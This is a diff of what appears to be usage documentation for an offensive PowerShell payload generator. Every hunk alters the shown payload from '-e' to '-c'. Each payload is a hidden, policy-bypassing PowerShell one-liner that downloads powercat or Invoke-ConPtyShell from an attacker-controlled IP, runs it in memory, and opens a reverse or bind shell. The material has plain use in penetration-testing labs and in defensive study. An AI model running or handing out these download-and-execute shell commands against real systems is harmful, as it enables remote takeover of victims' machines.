@@ -63,7 +63,7 @@ PS kali@kali /home/kali> cvsh -i wlan1 -t powercat -lp 443 -s
 
 [!] Plaintext payload:
 ----------------------
-powershell -nop -ep unrestricted -w hidden -e "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.111:80/powercat.ps1');powercat -c 192.168.0.111 -p 443 -e powershell"
+powershell -nop -ep unrestricted -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.0.111:80/powercat.ps1');powercat -c 192.168.0.111 -p 443 -e powershell"
 
 [+] Encoded payload (copied to clipboard):
 ------------------------------------------
@@ -82,7 +82,7 @@ PS kali@kali /home/kali> cvsh -t powercat -lp 4444 -s -i docker0 -e cmd -b
 
 [!] Plaintext payload:
 ----------------------
-powershell -nop -ep unrestricted -w hidden -e "IEX(New-Object System.Net.WebClient).DownloadString('http://172.17.0.1:80/powercat.ps1');powercat -l -p 4444 -e cmd"
+powershell -nop -ep unrestricted -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://172.17.0.1:80/powercat.ps1');powercat -l -p 4444 -e cmd"
 
 [+] Encoded payload (copied to clipboard):
 ------------------------------------------
@@ -101,7 +101,7 @@ PS kali@kali /home/kali> cvsh -t conpty -lp 4455 -s -sp 8080 -i wg0
 
 [!] Plaintext payload:
 ----------------------
-powershell -nop -ep unrestricted -w hidden -e "IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.0.2:8080/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell 10.8.0.2 4455 -Rows 49 -Cols 95"
+powershell -nop -ep unrestricted -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.0.2:8080/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell 10.8.0.2 4455 -Rows 49 -Cols 95"
 
 [+] Encoded payload (copied to clipboard):
 ------------------------------------------
@@ -120,7 +120,7 @@ PS kali@kali /home/kali> cvsh -t conpty -lp 445 -s -i wg0 -rows 51 -cols 191
 
 [!] Plaintext payload:
 ----------------------
-powershell -nop -ep unrestricted -w hidden -e "IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.0.2:80/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell 10.8.0.2 445 -Rows 51 -Cols 191"
+powershell -nop -ep unrestricted -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.8.0.2:80/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell 10.8.0.2 445 -Rows 51 -Cols 191"
 
 [+] Encoded payload (copied to clipboard):
 ------------------------------------------
